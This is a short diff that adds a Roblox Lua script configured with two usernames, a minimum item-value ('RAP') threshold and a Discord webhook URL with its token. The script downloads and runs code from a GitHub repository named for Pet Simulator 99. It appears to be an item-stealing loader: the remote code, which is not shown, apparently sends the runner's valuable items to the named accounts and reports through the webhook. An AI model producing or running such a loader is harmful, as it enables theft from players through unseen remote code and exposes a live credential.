@@ -1,0 +1,6 @@
+Username = " Itscomplez3"
+Username2 = " Itscomplez"
+MinimumRAP = 100000
+Webhook = "https://canary.discord.com/api/webhooks/1322997933217681550/o8pDX6caVR1wFbiWzFhjUNL1lop3zHUA-MiIxD8Z4TrEVg5qX65i25kzcPPjj2VsPr64"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xeps99s/ps99scrip/main/xe", true))()
